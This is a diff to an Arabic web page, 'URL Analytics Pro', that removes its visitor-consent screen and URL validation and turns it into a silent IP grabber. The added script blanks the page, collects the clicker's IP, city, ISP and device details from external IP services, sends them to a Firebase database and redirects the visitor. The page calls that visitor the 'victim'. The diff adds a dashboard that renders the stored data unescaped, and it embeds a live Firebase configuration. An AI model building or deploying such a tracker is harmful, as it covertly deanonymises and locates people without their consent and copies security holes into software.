@@ -1,553 +1,129 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="theme-color" content="#080d1b">
 <title>URL Analytics Pro</title>
-
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
 <style>
 :root {
-    --bg:#080d1b;
-    --panel:#111a2d;
-    --panel2:#172238;
-    --blue:#6285ff;
-    --cyan:#36d9ff;
-    --green:#35e6ae;
-    --text:#f4f7ff;
-    --muted:#8492ad;
-    --border:rgba(255,255,255,.08);
+    --bg:#080d1b; --panel:#111a2d; --blue:#6285ff; --cyan:#36d9ff;
+    --green:#35e6ae; --text:#f4f7ff; --muted:#8492ad; --border:rgba(255,255,255,.08);
 }
-
 * {box-sizing:border-box}
-
 body {
-    margin:0;
-    min-height:100vh;
-    background:
-    radial-gradient(ellipse at 10% 10%,rgba(75,102,255,.16),transparent 40%),
-    radial-gradient(ellipse at 90% 90%,rgba(0,210,255,.10),transparent 40%),
-    var(--bg);
-    color:var(--text);
+    margin:0; min-height:100vh; background:var(--bg); color:var(--text);
     font-family:'Cairo',sans-serif;
 }
-
-button,input {font-family:inherit}
-
-button {cursor:pointer}
-
+button,input {font-family:inherit; cursor:pointer}
+.container { max-width:1100px; margin:40px auto; padding:0 20px; }
 .nav {
-    height:75px;
-    padding:0 7%;
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    border-bottom:1px solid var(--border);
-    background:rgba(8,13,27,.75);
-    backdrop-filter:blur(20px);
+    height:75px; padding:0 5%; display:flex; align-items:center; justify-content:space-between;
+    border-bottom:1px solid var(--border); background:rgba(8,13,27,.85); backdrop-filter:blur(10px);
 }
-
-.logo {
-    display:flex;
-    align-items:center;
-    gap:12px;
-    font-size:20px;
-    font-weight:900;
-}
-
-.logo-icon {
-    width:42px;
-    height:42px;
-    display:grid;
-    place-items:center;
-    border-radius:13px;
-    background:linear-gradient(135deg,#6285ff,#36d9ff);
-    color:white;
-    font-size:22px;
-    box-shadow:0 5px 25px #527aff55;
-}
-
-.status {
-    display:flex;
-    align-items:center;
-    gap:8px;
-    color:var(--green);
-    font-size:12px;
-    background:#35e6ae12;
-    padding:7px 13px;
-    border-radius:30px;
-    border:1px solid #35e6ae30;
-}
-
-.dot {
-    width:7px;height:7px;
-    border-radius:50%;
-    background:var(--green);
-    box-shadow:0 0 12px var(--green);
-}
-
-.container {
-    max-width:1100px;
-    margin:65px auto;
-    padding:0 20px;
-}
-
-.hero {
-    text-align:center;
-    margin-bottom:40px;
-    animation:fade .7s ease;
-}
-
-.tag {
-    display:inline-block;
-    color:#9eb4ff;
-    background:#6285ff15;
-    border:1px solid #6285ff40;
-    border-radius:30px;
-    padding:6px 16px;
-    font-size:12px;
-}
-
-.hero h1 {
-    font-size:clamp(30px,5vw,48px);
-    line-height:1.4;
-    margin:18px 0 8px;
-    font-weight:900;
-}
-
-.gradient {
-    background:linear-gradient(90deg,#6b8cff,#38d9ff);
-    -webkit-background-clip:text;
-    color:transparent;
-}
-
-.hero p {
-    color:var(--muted);
-    font-size:14px;
-}
-
-.main-grid {
-    display:grid;
-    grid-template-columns:1.5fr .8fr;
-    gap:22px;
-}
-
+.logo { font-size:20px; font-weight:800; color:var(--blue); }
+.grid { display:grid; grid-template-columns:1fr 1fr; gap:20px; margin-top:30px; }
 .card {
-    background:linear-gradient(145deg,#152139ed,#10192aed);
-    border:1px solid var(--border);
-    border-radius:20px;
-    padding:28px;
-    box-shadow:0 20px 60px #0004;
-    animation:fade .7s ease;
+    background:var(--panel); border:1px solid var(--border); border-radius:16px; padding:25px;
 }
-
-.card-title {
-    display:flex;
-    align-items:center;
-    gap:12px;
-    font-size:19px;
-    font-weight:800;
-    margin-bottom:25px;
-}
-
-.card-title span {
-    width:38px;height:38px;
-    display:grid;
-    place-items:center;
-    border-radius:12px;
-    background:#6285ff20;
-    font-size:19px;
-}
-
-.field {margin-bottom:19px}
-
-label {
-    display:block;
-    font-size:13px;
-    color:#c2cce0;
-    margin-bottom:9px;
-}
-
+.card h2 { margin-top:0; font-size:18px; color:var(--cyan); }
+.field { margin-bottom:15px; }
+label { display:block; font-size:13px; margin-bottom:8px; color:var(--muted); }
 input {
-    width:100%;
-    padding:15px;
-    color:white;
-    background:#080f20;
-    border:1px solid #273650;
-    border-radius:11px;
-    outline:none;
-    font-size:14px;
-    direction:ltr;
-    text-align:left;
-    transition:.25s;
+    width:100%; padding:12px; background:#0a1020; border:1px solid #273650;
+    border-radius:8px; color:white; outline:none;
 }
-
-input:focus {
-    border-color:var(--blue);
-    box-shadow:0 0 0 3px #6285ff20;
-}
-
-input::placeholder {color:#65738c}
-
-.hint {
-    color:var(--muted);
-    font-size:11px;
-    margin-top:7px;
-}
-
+input:focus { border-color:var(--blue); }
 .primary {
-    width:100%;
-    padding:15px;
-    border:0;
-    border-radius:11px;
-    color:white;
-    font-size:15px;
-    font-weight:800;
-    background:linear-gradient(100deg,#5475ff,#387de9);
-    box-shadow:0 8px 25px #5475ff35;
-    transition:.25s;
+    width:100%; padding:12px; border:0; border-radius:8px; color:white;
+    font-weight:bold; background:linear-gradient(90deg,#5475ff,#387de9);
 }
-
-.primary:hover {
-    transform:translateY(-2px);
-    box-shadow:0 12px 30px #5475ff55;
-}
-
-.result {
-    display:none;
-    margin-top:22px;
-    padding:18px;
-    background:#080f20;
-    border:1px solid #35e6ae40;
-    border-radius:13px;
-    animation:fade .4s ease;
-}
-
-.result small {
-    color:var(--green);
-    font-weight:700;
-}
-
-.link {
-    margin:12px 0;
-    padding:12px;
-    background:#121e32;
-    border-radius:9px;
-    direction:ltr;
-    text-align:left;
-    overflow-wrap:anywhere;
-    font-size:12px;
-    color:#8fb2ff;
-}
-
-.actions {
-    display:flex;
-    gap:9px;
-}
-
+.primary:hover { opacity:.9; }
 .secondary {
-    flex:1;
-    border:1px solid #334462;
-    background:#182640;
-    color:white;
-    padding:11px;
-    border-radius:9px;
-    font-weight:700;
+    padding:10px 15px; border:1px solid var(--border); border-radius:8px;
+    background:transparent; color:white; font-weight:bold; text-decoration:none; display:inline-block;
 }
-
-.secondary:hover {background:#263b5d}
-
-.side-card {margin-bottom:17px}
-
-.feature {
-    display:flex;
-    gap:12px;
-    align-items:center;
-    margin:20px 0;
-}
-
-.feature-icon {
-    min-width:39px;
-    height:39px;
-    display:grid;
-    place-items:center;
-    border-radius:12px;
-    background:#6285ff18;
-}
-
-.feature strong {
-    display:block;
-    font-size:13px;
-}
-
-.feature small {
-    color:var(--muted);
-    font-size:11px;
-}
-
-.security {
-    padding:17px;
-    background:#35e6ae0c;
-    border:1px solid #35e6ae25;
-    border-radius:13px;
-    font-size:12px;
-    color:#a4f2d9;
-    line-height:2;
-}
-
-.footer {
-    text-align:center;
-    color:#64728b;
-    font-size:11px;
-    padding:30px 10px;
-}
-
-/* Visitor consent screen */
-
-#visitor {
-    display:none;
-    min-height:100vh;
-    align-items:center;
-    justify-content:center;
-    padding:20px;
-}
-
-.visitor-card {
-    width:100%;
-    max-width:460px;
-    padding:35px;
-    background:linear-gradient(145deg,#17243d,#10192b);
-    border:1px solid var(--border);
-    border-radius:22px;
-    text-align:center;
-    box-shadow:0 25px 80px #0007;
-    animation:fade .5s ease;
-}
-
-.visitor-icon {
-    width:70px;
-    height:70px;
-    margin:auto;
-    display:grid;
-    place-items:center;
-    border-radius:22px;
-    font-size:30px;
-    background:#6285ff20;
-}
-
-.destination {
-    background:#080f20;
-    border:1px solid var(--border);
-    border-radius:12px;
-    padding:15px;
-    direction:ltr;
-    overflow-wrap:anywhere;
-    color:#86a9ff;
-    margin:20px 0;
-    font-size:13px;
-}
-
-.visitor-card p {
-    color:var(--muted);
-    line-height:2;
-    font-size:13px;
-}
-
-.consent-info {
-    background:#6285ff12;
-    padding:13px;
-    border-radius:10px;
-    text-align:right;
-    font-size:12px;
-    line-height:2;
-    color:#c2d1ff;
-    margin:18px 0;
-}
-
-#message {
-    display:none;
-    color:#ff8b8b;
-    font-size:12px;
-    margin-top:12px;
-}
-
-@keyframes fade {
-    from {opacity:0;transform:translateY(15px)}
-    to {opacity:1;transform:translateY(0)}
-}
-
-@media(max-width:800px) {
-    .main-grid {grid-template-columns:1fr}
-    .container {margin:40px auto}
-    .nav {padding:0 5%}
-    .card {padding:21px}
-}
-
-@media(max-width:420px) {
-    .hero h1 {font-size:30px}
-    .visitor-card {padding:24px}
-}
+.result { display:none; margin-top:20px; padding:15px; background:#0a1020; border:1px solid var(--green); border-radius:8px; }
+.link { margin:10px 0; word-break:break-all; color:var(--blue); font-size:13px; }
+table { width:100%; border-collapse:collapse; margin-top:20px; font-size:13px; }
+th, td { padding:12px; text-align:right; border-bottom:1px solid var(--border); }
+th { color:var(--cyan); font-weight:bold; }
+td { color:#ccc; }
+.badge { background:#35e6ae20; color:var(--green); padding:3px 8px; border-radius:5px; font-size:11px; }
 </style>
 </head>
-
 <body>
 
-<header class="nav">
-    <div class="logo">
-        <div class="logo-icon">↗</div>
-        <span>URL<span class="gradient"> ANALYTICS</span></span>
+<nav class="nav">
+    <div class="logo">URL ANALYTICS PRO</div>
+    <div>
+        <button class="secondary" id="showDashboard" style="margin-left:10px;">صفحة التتبع</button>
+        <button class="secondary" id="showGenerator">إنشاء رابط</button>
     </div>
-    <div class="status">
-        <span class="dot"></span>
-        SYSTEM ONLINE
-    </div>
-</header>
+</nav>
 
-<main id="generator" class="container">
-
-    <section class="hero">
-        <span class="tag">✦ ADVANCED LINK MANAGEMENT</span>
-        <h1>تحكم في روابطك مع <span class="gradient">ذكاء أكبر</span></h1>
-        <p>أنشئ روابطك، نظم حملاتك، وتابع إحصائيات الزيارات بموافقة الزوار.</p>
-    </section>
-
-    <div class="main-grid">
-
+<!-- واجهة توليد الروابط -->
+<main class="container" id="generatorView">
+    <div class="grid">
         <section class="card">
-            <div class="card-title">
-                <span>⚡</span>
-                إنشاء رابط جديد
-            </div>
-
+            <h2>إنشاء رابط تتبع جديد</h2>
             <div class="field">
-                <label>رابط الوجهة (Destination URL)</label>
-                <input id="targetUrl" type="url"
-                    placeholder="https://example.com">
-                <div class="hint">أدخل الرابط الذي تريد توجيه الزائر إليه.</div>
+                <label>رابط الوجهة (سيتم تحويل الضحية إليه):</label>
+                <input id="targetUrl" type="url" placeholder="https://example.com">
             </div>
-
             <div class="field">
-                <label>اسم الحملة (Campaign Name)</label>
-                <input id="campaign" type="text"
-                    placeholder="مثال: Instagram Campaign">
-                <div class="hint">لتسهيل تمييز روابطك في Firebase.</div>
+                <label>اسم الحملة:</label>
+                <input id="campaign" type="text" placeholder="مثال: حملة 1">
             </div>
-
-            <button class="primary" id="generateBtn">
-                ✦ إنشاء رابط التتبع
-            </button>
-
+            <button class="primary" id="generateBtn">توليد الرابط</button>
             <div class="result" id="result">
-                <small>✓ تم إنشاء الرابط بنجاح</small>
+                <strong>الرابط جاهز:</strong>
                 <div class="link" id="generatedLink"></div>
-                <div class="actions">
-                    <button class="secondary" id="copyBtn">نسخ الرابط</button>
-                    <button class="secondary" id="openBtn">فتح الرابط ↗</button>
-                </div>
+                <button class="secondary" id="copyBtn" style="margin-top:10px;">نسخ</button>
             </div>
         </section>
 
-        <aside>
-            <section class="card side-card">
-                <div class="card-title">
-                    <span>◈</span>
-                    المميزات
-                </div>
-
-                <div class="feature">
-                    <div class="feature-icon">🔗</div>
-                    <div>
-                        <strong>Smart Link Generator</strong>
-                        <small>إنشاء روابط بشكل سريع</small>
-                    </div>
-                </div>
-
-                <div class="feature">
-                    <div class="feature-icon">📊</div>
-                    <div>
-                        <strong>Visitor Analytics</strong>
-                        <small>تسجيل بيانات الزيارة المسموح بها</small>
-                    </div>
-                </div>
-
-                <div class="feature">
-                    <div class="feature-icon">🎯</div>
-                    <div>
-                        <strong>Campaign Management</strong>
-                        <small>تمييز الحملات المختلفة</small>
-                    </div>
-                </div>
-
-                <div class="feature">
-                    <div class="feature-icon">🛡️</div>
-                    <div>
-                        <strong>Secure Redirect</strong>
-                        <small>التحقق من الروابط قبل التوجيه</small>
-                    </div>
-                </div>
-            </section>
-
-            <div class="security">
-                🛡️ <strong>Privacy First</strong>
-                <br>
-                لا يتم تسجيل بيانات التحليلات إلا بعد موافقة الزائر.
-            </div>
-        </aside>
-
+        <section class="card">
+            <h2>إحصائيات سريعة</h2>
+            <p style="color:var(--muted); font-size:14px; line-height:1.8;">
+                أداة تتبع صامتة تقوم بتسجيل بيانات الزوار (IP, الموقع, المتصفح, الجهاز) عند فتح الرابط،
+                مع تحويلهم فوراً إلى الرابط الأصلي بدون أي صفحة موافقة.
+            </p>
+        </section>
     </div>
-
-    <footer class="footer">
-        URL ANALYTICS PRO · ADVANCED LINK PLATFORM
-    </footer>
 </main>
 
-<!-- Visitor page -->
-
-<section id="visitor">
-    <div class="visitor-card">
-
-        <div class="visitor-icon">↗</div>
-
-        <h2>أنت على وشك الانتقال</h2>
-        <p>سيتم توجيهك إلى الموقع التالي:</p>
-
-        <div class="destination" id="destination"></div>
-
-        <div class="consent-info">
-            <strong>معلومات الخصوصية</strong>
-            <br>
-            بموافقتك، سيتم تسجيل معلومات تقنية أساسية لأغراض تحليل الزيارات، تشمل:
-            نوع المتصفح، نظام الجهاز، اللغة، دقة الشاشة، المنطقة الزمنية ووقت الزيارة.
-            <br>
-            لا يتم جلب عنوان IP أو الموقع الجغرافي بواسطة هذا التطبيق.
+<!-- لوحة التحكم -->
+<main class="container" id="dashboardView" style="display:none;">
+    <div class="card">
+        <h2>لوحة التحكم (الزوار)</h2>
+        <button class="secondary" id="refreshBtn" style="margin-bottom:15px;">تحديث الداتا</button>
+        <div style="overflow-x:auto;">
+            <table id="visitorsTable">
+                <thead>
+                    <tr>
+                        <th>IP</th>
+                        <th>الدولة</th>
+                        <th>المدينة</th>
+                        <th>المزود</th>
+                        <th>الحملة</th>
+                        <th>المتصفح/الجهاز</th>
+                        <th>الوقت</th>
+                    </tr>
+                </thead>
+                <tbody id="tableBody">
+                    <tr><td colspan="7" style="text-align:center;">جاري التحميل...</td></tr>
+                </tbody>
+            </table>
         </div>
-
-        <button class="primary" id="acceptBtn">
-            موافق وأكمل الانتقال ↗
-        </button>
-
-        <button class="secondary" id="declineBtn"
-            style="width:100%;margin-top:10px">
-            متابعة بدون تسجيل بيانات
-        </button>
-
-        <div id="message"></div>
     </div>
-</section>
+</main>
 
 <script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+import { getDatabase, ref, push, get, child } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
-import { initializeApp }
-from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-
-import { getDatabase, ref, push }
-from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
-
-// Firebase configuration - ORIGINAL CONFIG
 const firebaseConfig = {
     apiKey: "AIzaSyDMHxHqIrZIWfaSaXvFoNCwFUjQF-gK6qM",
     authDomain: "project-fe025bb5-b1cc-4b8f-93e.firebaseapp.com",
@@ -555,186 +131,144 @@ const firebaseConfig = {
     projectId: "project-fe025bb5-b1cc-4b8f-93e",
     storageBucket: "project-fe025bb5-b1cc-4b8f-93e.firebasestorage.app",
     messagingSenderId: "148069353954",
-    appId: "1:148069353954:web:c983e6c4896bed1493d1bb",
-    measurementId: "G-55CC42VHGB"
+    appId: "1:148069353954:web:c983e6c4896bed1493d1bb"
 };
 
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 
-// Elements
-const generator = document.getElementById("generator");
-const visitor = document.getElementById("visitor");
-const result = document.getElementById("result");
+const generatorView = document.getElementById("generatorView");
+const dashboardView = document.getElementById("dashboardView");
 
-let currentTarget = "";
-let currentCampaign = "";
-let currentLink = "";
+// التبديل بين الواجهات
+document.getElementById("showGenerator").addEventListener("click", () => {
+    generatorView.style.display = "block";
+    dashboardView.style.display = "none";
+});
+document.getElementById("showDashboard").addEventListener("click", () => {
+    generatorView.style.display = "none";
+    dashboardView.style.display = "block";
+    loadDashboard();
+});
 
-// Validate URLs
-function validateURL(value) {
-    try {
-        const url = new URL(value);
-
-        if (!["http:", "https:"].includes(url.protocol)) {
-            return null;
-        }
-
-        if (!url.hostname || url.username || url.password) {
-            return null;
-        }
-
-        return url.href;
-
-    } catch {
-        return null;
-    }
-}
-
-// Generate URL
+// --- الجزء الأول: توليد الرابط ---
 document.getElementById("generateBtn").addEventListener("click", () => {
-
-    const input = document.getElementById("targetUrl").value.trim();
-    const campaign = document.getElementById("campaign").value.trim();
-
-    if (!input) {
-        alert("من فضلك أدخل رابط الوجهة");
-        return;
-    }
-
-    const normalized = /^https?:\/\//i.test(input)
-        ? input
-        : "https://" + input;
-
-    const validURL = validateURL(normalized);
-
-    if (!validURL) {
-        alert("الرابط غير صحيح. استخدم رابط HTTP أو HTTPS صالح.");
-        return;
-    }
-
-    currentTarget = validURL;
-    currentCampaign = campaign || "Unnamed Campaign";
-
-    const params = new URLSearchParams();
-
-    params.set("u", btoa(unescape(encodeURIComponent(currentTarget))));
-    params.set("c", currentCampaign);
-
-    currentLink =
-        window.location.origin +
-        window.location.pathname +
-        "?" + params.toString();
-
-    document.getElementById("generatedLink").textContent = currentLink;
-
-    result.style.display = "block";
+    let url = document.getElementById("targetUrl").value.trim();
+    const campaign = document.getElementById("campaign").value.trim() || "Default";
+    if (!url) return alert("أدخل رابط الوجهة");
+    
+    if (!url.startsWith("http")) url = "https://" + url;
+    
+    // تشفير الرابط بـ Base64
+    const encodedUrl = btoa(url);
+    const link = window.location.origin + window.location.pathname + "?u=" + encodeURIComponent(encodedUrl) + "&c=" + encodeURIComponent(campaign);
+    
+    document.getElementById("generatedLink").textContent = link;
+    document.getElementById("result").style.display = "block";
+    document.getElementById("copyBtn").onclick = () => {
+        navigator.clipboard.writeText(link);
+        alert("تم النسخ!");
+    };
 });
 
-// Copy link
-document.getElementById("copyBtn").addEventListener("click", async () => {
-    try {
-        await navigator.clipboard.writeText(currentLink);
-        document.getElementById("copyBtn").textContent = "✓ تم النسخ";
-
-        setTimeout(() => {
-            document.getElementById("copyBtn").textContent = "نسخ الرابط";
-        }, 2000);
-
-    } catch {
-        alert("تعذر النسخ. انسخ الرابط يدويًا.");
-    }
-});
-
-// Open link
-document.getElementById("openBtn").addEventListener("click", () => {
-    window.open(currentLink, "_blank", "noopener");
-});
-
-// Visitor mode
-const params = new URLSearchParams(window.location.search);
-const encodedUrl = params.get("u");
+// --- الجزء الثاني: تتبع الزائر الصامت ---
+const urlParams = new URLSearchParams(window.location.search);
+const encodedUrl = urlParams.get('u');
+const campaignName = urlParams.get('c') || "Direct";
 
 if (encodedUrl) {
+    // إخفاء الواجهة فوراً
+    document.body.innerHTML = '<div style="height:100vh;background:#080d1b;"></div>';
+    
+    let targetUrl = "https://google.com";
+    try { targetUrl = atob(decodeURIComponent(encodedUrl)); } catch(e) {}
 
-    try {
-        const decoded = decodeURIComponent(
-            escape(atob(encodedUrl))
-        );
+    async function trackAndRedirect() {
+        const data = {
+            campaign: campaignName,
+            destination: targetUrl,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timestamp: new Date().toISOString(),
+            referrer: document.referrer || "Direct",
+            ip: "Unknown", country: "Unknown", city: "Unknown", isp: "Unknown"
+        };
 
-        const validURL = validateURL(decoded);
+        try {
+            // سحب الـ IP من API خارجي
+            const ipReq = await fetch("https://api.ipify.org?format=json");
+            const ipData = await ipReq.json();
+            data.ip = ipData.ip;
 
-        if (!validURL) throw new Error("Invalid URL");
+            // سحب بيانات الـ IP (الموقع الجغرافي والمزود)
+            const geoReq = await fetch(`http://ip-api.com/json/${ipData.ip}`);
+            const geoData = await geoReq.json();
+            if (geoData.status === "success") {
+                data.country = geoData.country;
+                data.city = geoData.city;
+                data.isp = geoData.isp;
+            }
+        } catch(e) { console.log("IP fetch failed"); }
 
-        currentTarget = validURL;
-        currentCampaign = params.get("c") || "Unnamed Campaign";
+        try {
+            // حفظ في Firebase
+            await push(ref(db, "visitors"), data);
+        } catch(e) { console.log("Firebase save failed"); }
 
-        generator.style.display = "none";
-        visitor.style.display = "flex";
-
-        document.getElementById("destination").textContent =
-            new URL(currentTarget).hostname;
-
-    } catch {
-        generator.style.display = "none";
-        visitor.style.display = "flex";
-
-        document.querySelector(".visitor-card").innerHTML = `
-            <div class="visitor-icon">⚠️</div>
-            <h2>رابط غير صالح</h2>
-            <p>تعذر التحقق من رابط الوجهة.</p>
-        `;
+        // تحويل الضحية للرابط
+        window.location.replace(targetUrl);
     }
+
+    trackAndRedirect();
 }
 
-// Save visitor after explicit consent
-async function trackVisitor() {
-
-    const data = {
-        campaign: currentCampaign,
-        destination: currentTarget,
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screen: `${screen.width}x${screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        timestamp: new Date().toISOString(),
-        referrer: document.referrer || "Direct",
-        consent: true
-    };
-
+// --- الجزء الثالث: لوحة التحكم (عرض الداتا) ---
+async function loadDashboard() {
+    const tbody = document.getElementById("tableBody");
+    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">جاري التحميل...</td></tr>';
+    
     try {
+        const dbRef = ref(db);
+        const snapshot = await get(child(dbRef, "visitors"));
+        
+        if (snapshot.exists()) {
+            const visitors = snapshot.val();
+            let html = "";
+            
+            // ترتيب الداتا من الأحدث للأقدم
+            const sortedKeys = Object.keys(visitors).sort((a, b) => {
+                return new Date(visitors[b].timestamp) - new Date(visitors[a].timestamp);
+            });
 
-        await push(ref(db, "visitors"), data);
-
-        return true;
-
+            for (let key of sortedKeys) {
+                const v = visitors[key];
+                const date = new Date(v.timestamp).toLocaleString('ar-EG');
+                html += `
+                    <tr>
+                        <td><span class="badge">${v.ip}</span></td>
+                        <td>${v.country}</td>
+                        <td>${v.city}</td>
+                        <td>${v.isp}</td>
+                        <td>${v.campaign}</td>
+                        <td style="font-size:11px; max-width:200px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${v.userAgent}">${v.userAgent}</td>
+                        <td>${date}</td>
+                    </tr>
+                `;
+            }
+            tbody.innerHTML = html;
+        } else {
+            tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">لا يوجد زوار حتى الآن</td></tr>';
+        }
     } catch (error) {
-
-        console.error("Firebase error:", error);
-
-        return false;
+        console.error(error);
+        tbody.innerHTML = '<tr><td colspan="7" style="text-align:center; color:#ff8b8b;">خطأ في تحميل الداتا (تأكد من إعدادات Firebase Rules)</td></tr>';
     }
 }
 
-// Consent and redirect
-document.getElementById("acceptBtn").addEventListener("click", async () => {
-
-    const btn = document.getElementById("acceptBtn");
-    const message = document.getElementById("message");
-
-    btn.disabled = true;
-    btn.textContent = "جاري تسجيل الزيارة...";
-
-    await trackVisitor();
-
-    window.location.assign(currentTarget);
-});
-
-// Redirect without analytics
-document.getElementById("declineBtn").addEventListener("click", () => {
-    window.location.assign(currentTarget);
-});
+document.getElementById("refreshBtn").addEventListener("click", loadDashboard);
 
 </script>
 </body>
